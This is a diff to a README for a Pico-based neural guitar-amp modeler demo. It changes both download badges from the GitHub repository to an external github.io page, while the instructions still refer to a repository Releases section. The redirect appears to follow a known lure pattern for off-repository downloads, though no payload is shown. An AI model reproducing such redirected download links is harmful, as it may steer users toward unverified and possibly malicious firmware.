@@ -1,6 +1,6 @@
 # 🎸 pico-neural-amp-modeler-demo - Bring guitar amp tones to life
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Tranquoc5064/pico-neural-amp-modeler-demo)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://tranquoc5064.github.io)
 
 ## 📌 Project Overview
 
@@ -20,7 +20,7 @@ To use this software, you need the following items:
 
 You need to download the firmware file to your computer. This file tells the hardware how to process your audio.
 
-[![](https://img.shields.io/badge/Download-Click_To_Access_Files-grey)](https://github.com/Tranquoc5064/pico-neural-amp-modeler-demo)
+[![](https://img.shields.io/badge/Download-Click_To_Access_Files-grey)](https://tranquoc5064.github.io)
 
 1. Open the link above in your web browser.
 2. Look for the section labeled Releases on the right side of the page.
